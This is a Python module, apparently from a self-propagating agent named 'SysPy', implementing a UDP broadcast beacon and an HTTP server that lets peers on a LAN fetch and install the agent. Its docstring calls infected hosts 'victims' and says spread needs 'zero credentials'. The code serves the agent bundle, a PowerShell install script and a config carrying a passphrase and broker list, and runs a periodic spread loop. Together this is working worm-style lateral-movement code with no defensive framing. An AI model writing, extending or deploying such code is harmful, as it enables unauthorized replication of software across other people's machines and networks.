"""UDP presence beacon + LAN kit server.

The beacon is the reason a fresh victim finds its siblings without a broker and
without knowing anything but a broadcast address: every agent shouts a one-line
record on UDP/8788 every 10s and answers unicast '?' probes.

The kit server is the reason spread works with **zero credentials**: a peer
fetches this host's bundle over plain HTTP and installs itself from it.
"""
from __future__ import annotations

import json
import os
import socket
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from .. import config
from . import discover as lan_discover

MAGIC = "SYSPY1"
_LOCK = threading.Lock()


class Beacon:
    """Broadcasts our presence and keeps a TTL'd table of peers."""

    def __init__(self, port: int = None, interval: float = None, ttl: float = None):
        self.port = int(port or config.LAN_PORT)
        self.interval = float(interval or config.LAN_BEACON_INTERVAL)
        self.ttl = float(ttl or config.LAN_PEER_TTL)
        self._peers: dict = {}
        self._stop = threading.Event()
        self._threads: list = []
        self.on_peer = None  # callback(record) fired once per new peer id

    # ------------------------------------------------------------ wire format

    def info(self, extra: dict = None) -> dict:
        payload = {
            "id": config.agent_id(),
            "host": config.hostname(),
            "os": config.os_kind(),
            "port": config.LAN_HTTP_PORT,
            "ver": config.PRODUCT_VERSION,
            "hop": config.hop(),
            "parent": config.parent_id(),
            "ts": int(time.time()),
        }
        if extra:
            payload.update(extra)
        return payload

    @staticmethod
    def encode(payload: dict, kind: str = "hello") -> bytes:
        return ("%s|%s|%s" % (MAGIC, kind,
                              json.dumps(payload, separators=(",", ":")))).encode()

    @staticmethod
    def decode(data: bytes):
        """Return (kind, payload) or (None, None) for a foreign packet."""
        try:
            text = data.decode("utf-8", "replace")
        except Exception:
            return None, None
        if not text.startswith(MAGIC + "|"):
            return None, None
        parts = text.split("|", 2)
        if len(parts) < 3:
            return None, None
        try:
            return parts[1], json.loads(parts[2])
        except ValueError:
            return None, None

    # ---------------------------------------------------------------- threads

    def start(self) -> bool:
        if self._threads:
            return True
        for target in (self._listen, self._announce):
            thread = threading.Thread(target=target, name="syspy-beacon", daemon=True)
            thread.start()
            self._threads.append(thread)
        return True

    def stop(self) -> None:
        self._stop.set()

    def _bind(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            for option in ("SO_REUSEPORT",):
                try:
                    sock.setsockopt(socket.SOL_SOCKET, getattr(socket, option), 1)
                except (AttributeError, OSError):
                    pass
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            except OSError:
                pass
            sock.bind(("", self.port))
            return sock
        except OSError:
            return None

    def _listen(self) -> None:
        sock = self._bind()
        if sock is None:
            return
        sock.settimeout(1.0)
        while not self._stop.is_set():
            try:
                data, addr = sock.recvfrom(2048)
            except socket.timeout:
                continue
            except OSError:
                time.sleep(0.5)
                continue
            kind, payload = self.decode(data)
            if not payload or payload.get("id") == config.agent_id():
                continue
            if kind == "ping":
                try:
                    sock.sendto(self.encode(self.info(), "pong"), addr)
                except OSError:
                    pass
                continue
            if kind == "bye":
                with _LOCK:
                    self._peers.pop(payload.get("id"), None)
                continue
            payload["ip"] = addr[0]
            payload["seen"] = time.time()
            with _LOCK:
                is_new = payload["id"] not in self._peers
                self._peers[payload["id"]] = payload
            if is_new and self.on_peer:
                try:
                    self.on_peer(payload)
                except Exception:
                    pass
        try:
            sock.close()
        except OSError:
            pass

    def _targets(self) -> list:
        targets = [("255.255.255.255", self.port)]
        try:
            import ipaddress
            for network, _iface in lan_discover.local_subnets():
                try:
                    targets.append(
                        (str(ipaddress.ip_network(network, strict=False).broadcast_address),
                         self.port))
                except Exception:
                    continue
        except Exception:
            pass
        return targets

    def _announce(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        except OSError:
            pass
        blob = self.encode(self.info())
        while not self._stop.is_set():
            for host, port in self._targets():
                try:
                    sock.sendto(blob, (host, port))
                except OSError:
                    pass
            self._expire()
            self._stop.wait(self.interval)
        try:
            bye = self.encode(self.info(), "bye")
            for host, port in self._targets():
                try:
                    sock.sendto(bye, (host, port))
                except OSError:
                    pass
        except Exception:
            pass
        try:
            sock.close()
        except OSError:
            pass

    def _expire(self) -> None:
        cutoff = time.time() - self.ttl
        with _LOCK:
            for peer_id in [k for k, v in self._peers.items() if v.get("seen", 0) < cutoff]:
                self._peers.pop(peer_id, None)

    # -------------------------------------------------------------- accessors

    def peers(self, fresh: bool = True) -> list:
        if fresh:
            self._expire()
        with _LOCK:
            return [dict(record) for record in self._peers.values()]

    def ask(self, timeout: float = 1.0) -> list:
        """Active probe: broadcast a ping and collect replies."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.settimeout(0.3)
            probe = self.encode(self.info(), "ping")
            for host, port in self._targets():
                try:
                    sock.sendto(probe, (host, port))
                except OSError:
                    pass
            deadline = time.time() + timeout
            while time.time() < deadline:
                try:
                    data, addr = sock.recvfrom(2048)
                except socket.timeout:
                    continue
                kind, payload = self.decode(data)
                if not payload or payload.get("id") == config.agent_id():
                    continue
                payload["ip"] = addr[0]
                payload["seen"] = time.time()
                with _LOCK:
                    self._peers[payload["id"]] = payload
        finally:
            try:
                sock.close()
            except OSError:
                pass
        return self.peers()


class _KitHandler(BaseHTTPRequestHandler):
    server_version = "SysPyKit"
    protocol_version = "HTTP/1.0"

    def log_message(self, *args):
        pass

    def _send(self, code: int, body: bytes, ctype: str = "application/octet-stream"):
        try:
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            self.send_header("X-SysPy-Id", config.agent_id())
            self.send_header("X-SysPy-Ver", config.PRODUCT_VERSION)
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(body)
        except (BrokenPipeError, ConnectionResetError, OSError):
            pass

    def do_GET(self):
        path = self.path.split("?", 1)[0]
        if path == "/ping":
            body = json.dumps({
                "ok": True,
                "id": config.agent_id(),
                "host": config.hostname(),
                "os": config.os_kind(),
                "ver": config.PRODUCT_VERSION,
                "hop": config.hop(),
                "parent": config.parent_id(),
                "kit": self.server.kit_url(),
            }).encode()
            return self._send(200, body, "application/json")
        if path == "/kit":
            try:
                return self._send(200, self.server.kit_bytes())
            except Exception as exc:
                return self._send(500, str(exc).encode(), "text/plain")
        if path == "/deploy.json":
            return self._send(200, json.dumps(self.server.deploy_overlay()).encode(),
                              "application/json")
        if path in ("/", "/i.ps1"):
            return self._send(200, self.server.install_script(), "text/plain")
        return self._send(404, b"not found", "text/plain")


class KitServer:
    """Serves the agent bundle to LAN peers so spread needs no internet."""

    def __init__(self, port: int = None, bundle_root: str = None):
        self.port = int(port or config.LAN_HTTP_PORT)
        self.bundle_root = bundle_root or config.ROOT
        self._http = None
        self._cache = {"stamp": None, "blob": b""}
        self._lock = threading.Lock()

    # ---------------------------------------------------------------- content

    def kit_url(self) -> str:
        interfaces = lan_discover.local_interfaces()
        ip = interfaces[0]["ip"] if interfaces else "127.0.0.1"
        return "http://%s:%s" % (ip, self.port)

    def deploy_overlay(self) -> dict:
        return {
            "url": config.PUBLIC_URL,
            "room": config.ROOM,
            "pass": config.PASSPHRASE,
            "parent": config.agent_id(),
            "parent_ip": self.kit_url(),
            "hop": config.hop() + 1,
            "brokers": config.BROKERS,
        }

    def install_script(self) -> bytes:
        for candidate in (os.path.join(self.bundle_root, "install", "i.ps1"),
                          os.path.join(config.ROOT, "install", "i.ps1")):
            try:
                with open(candidate, "rb") as handle:
                    return handle.read()
            except OSError:
                continue
        return b"# i.ps1 missing from bundle"

    def kit_bytes(self) -> bytes:
        from .. import packaging
        with self._lock:
            try:
                stamp = str(os.path.getmtime(os.path.join(self.bundle_root, "agent.py")))
            except OSError:
                stamp = str(time.time())
            if self._cache["stamp"] == stamp and self._cache["blob"]:
                return self._cache["blob"]
            overlay = {"deploy.json": json.dumps(self.deploy_overlay()).encode()}
            try:
                blob = packaging.build_zip(self.bundle_root, extra=overlay)
            except TypeError:            # pre-Part-4.11 signature
                blob = packaging.build_zip(self.bundle_root)
            self._cache = {"stamp": stamp, "blob": blob}
            return blob

    # ----------------------------------------------------------------- server

    def start(self) -> bool:
        try:
            self._http = ThreadingHTTPServer(("", self.port), _KitHandler)
        except OSError:
            self._http = None
            return False
        self._http.daemon_threads = True
        self._http.kit_bytes = self.kit_bytes
        self._http.kit_url = self.kit_url
        self._http.deploy_overlay = self.deploy_overlay
        self._http.install_script = self.install_script
        threading.Thread(target=self._http.serve_forever, name="syspy-kit",
                         daemon=True).start()
        return True

    def stop(self) -> None:
        if self._http:
            try:
                self._http.shutdown()
                self._http.server_close()
            except Exception:
                pass
            self._http = None


class LanService:
    """Beacon + kit server + the periodic spread tick."""

    def __init__(self, on_peer=None, spreader=None):
        self.beacon = Beacon()
        self.kit = KitServer()
        self.spreader = spreader
        self.beacon.on_peer = on_peer
        self._stop = threading.Event()
        self._threads: list = []

    def start(self) -> dict:
        status = {"beacon": False, "kit": False, "spread": False}
        if not config.LAN_ENABLED:
            return status
        try:
            status["beacon"] = bool(self.beacon.start())
        except Exception:
            status["beacon"] = False
        status["kit"] = self.kit.start()
        if self.spreader is not None:
            self.spreader.attach(self, kit_url_getter=self.kit.kit_url)
        if config.SPREAD_ENABLED and self.spreader is not None:
            thread = threading.Thread(target=self._spread_loop, name="syspy-spread",
                                      daemon=True)
            thread.start()
            self._threads.append(thread)
            status["spread"] = True
        return status

    def stop(self) -> None:
        self._stop.set()
        self.beacon.stop()
        self.kit.stop()

    def _spread_loop(self) -> None:
        time.sleep(20)  # let the network settle before touching anything
        while not self._stop.is_set():
            try:
                self.spreader.tick()
            except Exception:
                pass
            self._stop.wait(config.SPREAD_INTERVAL)

    def state(self) -> dict:
        peers = self.beacon.peers()
        return {
            "port": self.kit.port,
            "url": self.kit.kit_url(),
            "peers": len(peers),
            "peer_ids": [peer.get("id") for peer in peers],
        }


def start_service(on_peer=None, spreader=None) -> LanService:
    service = LanService(on_peer=on_peer, spreader=spreader)
    service.start()
    return service


if __name__ == "__main__":
    # Smoke test:  python -m syspy.lan.beacon
    service = LanService()
    print("beacon port :", service.beacon.port)
    print("kit         :", service.kit.kit_url())
    print("local nets  :", lan_discover.local_subnets())
    service.start()
    print("broadcasting, listening 4s...")
    time.sleep(4)
    print("peers       :", service.beacon.ask(timeout=2.0))
    print("kit bytes   :", len(service.kit.kit_bytes()))
    service.stop()